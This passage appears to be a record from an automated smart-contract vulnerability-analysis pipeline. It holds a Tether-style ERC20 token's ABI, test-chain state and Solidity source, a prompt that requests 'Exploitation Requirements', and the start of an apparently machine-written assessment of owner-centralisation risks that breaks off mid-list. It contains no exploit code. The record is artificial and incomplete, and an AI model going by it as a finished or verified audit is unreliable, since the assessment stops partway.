        "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x67B5656d60a809915323Bf2C40A8bEF15A152e3e": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99842250980000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:\n\n- The main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:\n  - Pausable functionality (pause/unpause by owner)\n  - Blacklist functionality (owner can blacklist addresses, preventing transfers)\n  - Upgradeability mechanism (can deprecate itself and forward calls to an upgraded contract)\n  - Fee mechanism (basisPointsRate and maximumFee, though initially set to zero)\n  - Minting (issue) and burning (redeem) tokens by owner\n  - Ability for owner to destroy tokens of blacklisted users (destroyBlackFunds)\n  \n- Other contracts (Ownable, Pausable, BlackList, StandardToken, BasicToken, SafeMath) are standard utility or base contracts supporting TetherToken.\n\n- Solidity version pragma is `^0.4.17`.\n\n2. Vulnerability Assessment:\n\n**A. Centralization / Owner Privileges:**\n\n- The owner has extensive control:\n  - Can pause/unpause all token transfers.\n  - Can blacklist any address, blocking their transfers.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating user funds.\n  - Can issue new tokens arbitrarily, inflating supply and crediting self.\n  - Can redeem (burn) tokens from own balance.\n  - Can deprecate the contract and redirect all calls to an upgraded contract.\n  - Can set fee parameters (basisPointsRate and maximumFee).\n\n**Impact:**  \nThis centralization means the owner can censor users, confiscate tokens, inflate supply, and upgrade to arbitrary code. This is a trust assumption risk rather than a technical bug, but it is a critical security consideration.\n\n---\n\n**B. 